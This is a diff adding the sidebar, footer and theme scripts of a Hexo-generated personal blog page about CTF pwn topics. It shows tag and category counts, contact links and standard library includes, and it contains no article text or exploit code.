+                        <p class="title has-text-weight-normal">
+                            18
+                        </p>
+                    </a>
+                </div>
+            </div>
+            <div class="level-item has-text-centered is-marginless">
+                <div>
+                    <p class="heading">
+                        分类
+                    </p>
+                    <a href="/categories">
+                        <p class="title has-text-weight-normal">
+                            4
+                        </p>
+                    </a>
+                </div>
+            </div>
+            <div class="level-item has-text-centered is-marginless">
+                <div>
+                    <p class="heading">
+                        标签
+                    </p>
+                    <a href="/tags">
+                        <p class="title has-text-weight-normal">
+                            13
+                        </p>
+                    </a>
+                </div>
+            </div>
+        </nav>
+        
+        
+        
+        <div class="level is-mobile">
+            
+            <a class="level-item button is-white is-marginless" target="_blank" rel="noopener"
+                title="Github" href="https://github.com/mask6asok">
+                
+                <i class="fab fa-github"></i>
+                
+            </a>
+            
+            <a class="level-item button is-white is-marginless" target="_blank" rel="noopener"
+                title="QQ" href="tencent://message/?uin=1924594189&amp;Site=&amp;menu=yes">
+                
+                <i class="fab fa-qq"></i>
+                
+            </a>
+            
+            <a class="level-item button is-white is-marginless" target="_blank" rel="noopener"
+                title="Email" href="mailto:1924594189@qq.com">
+                
+                <i class="fa fa-envelope"></i>
+                
+            </a>
+            
+        </div>
+        
+    </div>
+</div>
+    
+        <div class="card widget">
+    <div class="card-content">
+        <div class="menu">
+        <h3 class="menu-label">
+            链接
+        </h3>
+        <ul class="menu-list">
+        
+            <li>
+                <a class="level is-mobile" href="https://binlep.github.io/" target="_blank" rel="noopener">
+                    <span class="level-left">
+                        <span class="level-item">binLep&#39;s blog</span>
+                    </span>
+                    <span class="level-right">
+                        <span class="level-item tag">binlep.github.io</span>
+                    </span>
+                </a>
+            </li>
+        
+        </ul>
+        </div>
+    </div>
+</div>
+
+    
+    
+        <div class="column-right-shadow is-hidden-widescreen is-sticky">
+        
+            
+<div class="card widget">
+    <div class="card-content">
+        <div class="menu">
+            <h3 class="menu-label">
+                分类
+            </h3>
+            <ul class="menu-list">
+            <li>
+        <a class="level is-marginless" href="/categories/Crypto/">
+            <span class="level-start">
+                <span class="level-item">Crypto</span>
+            </span>
+            <span class="level-end">
+                <span class="level-item tag">1</span>
+            </span>
+        </a></li><li>
+        <a class="level is-marginless" href="/categories/DBMS/">
+            <span class="level-start">
+                <span class="level-item">DBMS</span>
+            </span>
+            <span class="level-end">
+                <span class="level-item tag">1</span>
+            </span>
+        </a></li><li>
+        <a class="level is-marginless" href="/categories/Others/">
+            <span class="level-start">
+                <span class="level-item">Others</span>
+            </span>
+            <span class="level-end">
+                <span class="level-item tag">1</span>
+            </span>
+        </a></li><li>
+        <a class="level is-marginless" href="/categories/Pwn/">
+            <span class="level-start">
+                <span class="level-item">Pwn</span>
+            </span>
+            <span class="level-end">
+                <span class="level-item tag">14</span>
+            </span>
+        </a></li>
+            </ul>
+        </div>
+    </div>
+</div>
+        
+            <div class="card widget">
+    <div class="card-content">
+        <div class="menu">
+            <h3 class="menu-label">
+                标签
+            </h3>
+            <div class="field is-grouped is-grouped-multiline">
+                
+                <div class="control">
+                    <a class="tags has-addons" href="/tags/Conditional-competition/">
+                        <span class="tag">Conditional competition</span>
+                        <span class="tag is-grey">1</span>
+                    </a>
+                </div>
+                
+                <div class="control">
+                    <a class="tags has-addons" href="/tags/IOFILE/">
+                        <span class="tag">IOFILE</span>
+                        <span class="tag is-grey">1</span>
+                    </a>
+                </div>
+                
+                <div class="control">
+                    <a class="tags has-addons" href="/tags/arm/">
+                        <span class="tag">arm</span>
+                        <span class="tag is-grey">2</span>
+                    </a>
+                </div>
+                
+                <div class="control">
+                    <a class="tags has-addons" href="/tags/fmt/">
+                        <span class="tag">fmt</span>
+                        <span class="tag is-grey">2</span>
+                    </a>
+                </div>
+                
+                <div class="control">
+                    <a class="tags has-addons" href="/tags/format/">
+                        <span class="tag">format</span>
+                        <span class="tag is-grey">1</span>
+                    </a>
+                </div>
+                
+                <div class="control">
+                    <a class="tags has-addons" href="/tags/heap/">
+                        <span class="tag">heap</span>
+                        <span class="tag is-grey">4</span>
+                    </a>
+                </div>
+                
+                <div class="control">
+                    <a class="tags has-addons" href="/tags/integer-overflow/">
+                        <span class="tag">integer overflow</span>
+                        <span class="tag is-grey">1</span>
+                    </a>
+                </div>
+                
+                <div class="control">
+                    <a class="tags has-addons" href="/tags/kernel/">
+                        <span class="tag">kernel</span>
+                        <span class="tag is-grey">5</span>
+                    </a>
+                </div>
+                
+                <div class="control">
+                    <a class="tags has-addons" href="/tags/libc/">
+                        <span class="tag">libc</span>
+                        <span class="tag is-grey">2</span>
+                    </a>
+                </div>
+                
+                <div class="control">
+                    <a class="tags has-addons" href="/tags/pwn/">
+                        <span class="tag">pwn</span>
+                        <span class="tag is-grey">10</span>
+                    </a>
+                </div>
+                
+                <div class="control">
+                    <a class="tags has-addons" href="/tags/shellcode/">
+                        <span class="tag">shellcode</span>
+                        <span class="tag is-grey">1</span>
+                    </a>
+                </div>
+                
+                <div class="control">
+                    <a class="tags has-addons" href="/tags/stack/">
+                        <span class="tag">stack</span>
+                        <span class="tag is-grey">2</span>
+                    </a>
+                </div>
+                
+                <div class="control">
+                    <a class="tags has-addons" href="/tags/tcache/">
+                        <span class="tag">tcache</span>
+                        <span class="tag is-grey">2</span>
+                    </a>
+                </div>
+                
+            </div>
+        </div>
+    </div>
+</div>
+        
+        </div>
+    
+</div>
+
+                
+
+
+
+
+<div class="column is-4-tablet is-4-desktop is-3-widescreen is-hidden-touch is-hidden-desktop-only has-order-3 column-right is-sticky">
+    
+        
+<div class="card widget">
+    <div class="card-content">
+        <div class="menu">
+            <h3 class="menu-label">
+                分类
+            </h3>
+            <ul class="menu-list">
+            <li>
+        <a class="level is-marginless" href="/categories/Crypto/">
+            <span class="level-start">
+                <span class="level-item">Crypto</span>
+            </span>
+            <span class="level-end">
+                <span class="level-item tag">1</span>
+            </span>
+        </a></li><li>
+        <a class="level is-marginless" href="/categories/DBMS/">
+            <span class="level-start">
+                <span class="level-item">DBMS</span>
+            </span>
+            <span class="level-end">
+                <span class="level-item tag">1</span>
+            </span>
+        </a></li><li>
+        <a class="level is-marginless" href="/categories/Others/">
+            <span class="level-start">
+                <span class="level-item">Others</span>
+            </span>
+            <span class="level-end">
+                <span class="level-item tag">1</span>
+            </span>
+        </a></li><li>
+        <a class="level is-marginless" href="/categories/Pwn/">
+            <span class="level-start">
+                <span class="level-item">Pwn</span>
+            </span>
+            <span class="level-end">
+                <span class="level-item tag">14</span>
+            </span>
+        </a></li>
+            </ul>
+        </div>
+    </div>
+</div>
+    
+        <div class="card widget">
+    <div class="card-content">
+        <div class="menu">
+            <h3 class="menu-label">
+                标签
+            </h3>
+            <div class="field is-grouped is-grouped-multiline">
+                
+                <div class="control">
+                    <a class="tags has-addons" href="/tags/Conditional-competition/">
+                        <span class="tag">Conditional competition</span>
+                        <span class="tag is-grey">1</span>
+                    </a>
+                </div>
+                
+                <div class="control">
+                    <a class="tags has-addons" href="/tags/IOFILE/">
+                        <span class="tag">IOFILE</span>
+                        <span class="tag is-grey">1</span>
+                    </a>
+                </div>
+                
+                <div class="control">
+                    <a class="tags has-addons" href="/tags/arm/">
+                        <span class="tag">arm</span>
+                        <span class="tag is-grey">2</span>
+                    </a>
+                </div>
+                
+                <div class="control">
+                    <a class="tags has-addons" href="/tags/fmt/">
+                        <span class="tag">fmt</span>
+                        <span class="tag is-grey">2</span>
+                    </a>
+                </div>
+                
+                <div class="control">
+                    <a class="tags has-addons" href="/tags/format/">
+                        <span class="tag">format</span>
+                        <span class="tag is-grey">1</span>
+                    </a>
+                </div>
+                
+                <div class="control">
+                    <a class="tags has-addons" href="/tags/heap/">
+                        <span class="tag">heap</span>
+                        <span class="tag is-grey">4</span>
+                    </a>
+                </div>
+                
+                <div class="control">
+                    <a class="tags has-addons" href="/tags/integer-overflow/">
+                        <span class="tag">integer overflow</span>
+                        <span class="tag is-grey">1</span>
+                    </a>
+                </div>
+                
+                <div class="control">
+                    <a class="tags has-addons" href="/tags/kernel/">
+                        <span class="tag">kernel</span>
+                        <span class="tag is-grey">5</span>
+                    </a>
+                </div>
+                
+                <div class="control">
+                    <a class="tags has-addons" href="/tags/libc/">
+                        <span class="tag">libc</span>
+                        <span class="tag is-grey">2</span>
+                    </a>
+                </div>
+                
+                <div class="control">
+                    <a class="tags has-addons" href="/tags/pwn/">
+                        <span class="tag">pwn</span>
+                        <span class="tag is-grey">10</span>
+                    </a>
+                </div>
+                
+                <div class="control">
+                    <a class="tags has-addons" href="/tags/shellcode/">
+                        <span class="tag">shellcode</span>
+                        <span class="tag is-grey">1</span>
+                    </a>
+                </div>
+                
+                <div class="control">
+                    <a class="tags has-addons" href="/tags/stack/">
+                        <span class="tag">stack</span>
+                        <span class="tag is-grey">2</span>
+                    </a>
+                </div>
+                
+                <div class="control">
+                    <a class="tags has-addons" href="/tags/tcache/">
+                        <span class="tag">tcache</span>
+                        <span class="tag is-grey">2</span>
+                    </a>
+                </div>
+                
+            </div>
+        </div>
+    </div>
+</div>
+    
+    
+</div>
+
+            </div>
+        </div>
+    </section>
+    <footer class="footer">
+    <div class="container">
+        <div class="level">
+            <div class="level-start has-text-centered-mobile">
+                <a class="footer-logo is-block has-mb-6" href="/">
+                
+                    <img src="/images/logo.ico" alt="Linux Kernel Pwn Ⅳ：Double Fetch" height="28">
+                
+                </a>
+                <p class="is-size-7">
+                &copy; 2020 Mask&nbsp;
+                Powered by <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a> & <a
+                        href="https://github.com/ppoffice/hexo-theme-icarus" target="_blank" rel="noopener">Icarus</a>
+                
+                </p>
+            </div>
+            <div class="level-end">
+            
+            </div>
+        </div>
+    </div>
+</footer>
+    <script src="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/moment@2.22.2/min/moment-with-locales.min.js"></script>
+<script>moment.locale("zh-CN");</script>
+
+
+<script>
+var IcarusThemeSettings = {
+    site: {
+        url: 'Mask6asok.github.io',
+        external_link: {"enable":true,"exclude":[]}
+    },
+    article: {
+        highlight: {
+            clipboard: false,
+            fold: ''
+        }
+    }
+};
+</script>
+
+
+
+
+
+
+<script src="/js/animation.js"></script>
+
+
+
+<script src="https://cdn.jsdelivr.net/npm/lightgallery@1.6.8/dist/js/lightgallery.min.js" defer></script>
+<script src="https://cdn.jsdelivr.net/npm/justifiedGallery@3.7.0/dist/js/jquery.justifiedGallery.min.js" defer></script>
+<script src="/js/gallery.js" defer></script>
+
+
+
+<div id="outdated">
+    <h6>Your browser is out-of-date!</h6>
+    <p>Update your browser to view this website correctly. <a id="btnUpdateBrowser" href="http://outdatedbrowser.com/">Update
+            my browser now </a></p>
+    <p class="last"><a href="#" id="btnCloseUpdateBrowser" title="Close">&times;</a></p>
+</div>
+<script src="https://cdn.jsdelivr.net/npm/outdatedbrowser@1.1.5/outdatedbrowser/outdatedbrowser.min.js" defer></script>
+<script>
+    document.addEventListener("DOMContentLoaded", function () {
+        outdatedBrowser({
+            bgColor: '#f25648',
+            color: '#ffffff',
+            lowerThan: 'flex'
+        });
+    });
+</script>
+
+
+<script src="https://cdn.jsdelivr.net/npm/mathjax@2.7.5/unpacked/MathJax.js?config=TeX-MML-AM_CHTML" defer></script>
+<script>
+document.addEventListener('DOMContentLoaded', function () {
+    MathJax.Hub.Config({
+        'HTML-CSS': {
+            matchFontHeight: false
+        },
+        SVG: {
+            matchFontHeight: false
+        },
+        CommonHTML: {
+            matchFontHeight: false
+        },
+        tex2jax: {
+            inlineMath: [
+                ['$','$'],
+                ['\\(','\\)']
+            ]
+        }
+    });
+});
+</script>
+
+
+<a id="back-to-top" title="回到顶端" href="javascript:;">
+    <i class="fas fa-chevron-up"></i>
+</a>
+<script src="/js/back-to-top.js" defer></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<script src="/js/main.js" defer></script>
+
+    
+    <div class="searchbox ins-search">
+    <div class="searchbox-container ins-search-container">
+        <div class="searchbox-input-wrapper">
+            <input type="text" class="searchbox-input ins-search-input" placeholder="想要查找什么..." />
+            <span class="searchbox-close ins-close ins-selectable"><i class="fa fa-times-circle"></i></span>
+        </div>
+        <div class="searchbox-result-wrapper ins-section-wrapper">
+            <div class="ins-section-container"></div>
+        </div>
+    </div>
+</div>
+<script>
+    (function (window) {
+        var INSIGHT_CONFIG = {
+            TRANSLATION: {
+                POSTS: '文章',
+                PAGES: '页面',
+                CATEGORIES: '分类',
+                TAGS: '标签',
+                UNTITLED: '(无标题)',
+            },
+            CONTENT_URL: '/content.json',
+        };
+        window.INSIGHT_CONFIG = INSIGHT_CONFIG;
+    })(window);
+</script>
+<script src="/js/insight.js" defer></script>
+<link rel="stylesheet" href="/css/search.css">
+<link rel="stylesheet" href="/css/insight.css">
+    
+</body>
+</html>
